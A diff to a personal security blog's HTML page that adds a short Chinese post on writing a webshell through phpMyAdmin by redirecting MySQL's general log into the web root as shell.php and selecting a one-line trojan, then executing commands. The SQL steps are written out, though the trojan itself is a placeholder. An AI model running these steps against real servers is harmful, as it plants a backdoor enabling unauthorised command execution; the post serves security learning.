@@ -618,6 +618,79 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/06/phpMyAdmin%E7%9A%84%E6%97%A5%E5%BF%97%E5%86%99%E5%85%A5shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/love.jpg">
+      <meta itemprop="name" content="Poem_n">
+      <meta itemprop="description" content="网安征程">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Poem_n的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/10/06/phpMyAdmin%E7%9A%84%E6%97%A5%E5%BF%97%E5%86%99%E5%85%A5shell/" class="post-title-link" itemprop="url">phpMyAdmin的日志写入shell</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-10-06 10:22:57 / 修改时间：10:47:20" itemprop="dateCreated datePublished" datetime="2021-10-06T10:22:57+08:00">2021-10-06</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>约束：权限为 root ，phpmyadmin管理页面泄露</p>
+<p>原理：全局函数的可控，导致日志属性（路径，内容）的可控。</p>
+<ul>
+<li><p>general log 指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。</p>
+</li>
+<li><p>general log file 指的是日志的保存路径。</p>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://localhost/phpMyAdmin/">set general_log =’on’;</a> 状态设置为打开。默认为关闭</p>
+<p>set global general_log_file=’E:/oldphpstday/WWW/shell.php’;</p>
+<p>将路径设置为网站目录，并命名为shell.php</p>
+<p>我们查询：</p>
+<p>SELECT ‘一句话木马’ ;</p>
+<p>POST中不用引号也可以</p>
+<p>之后在网站的个目录找到shell.php 就可以命令执行了 .</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/05/hello-world/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -751,7 +824,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-count">7</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
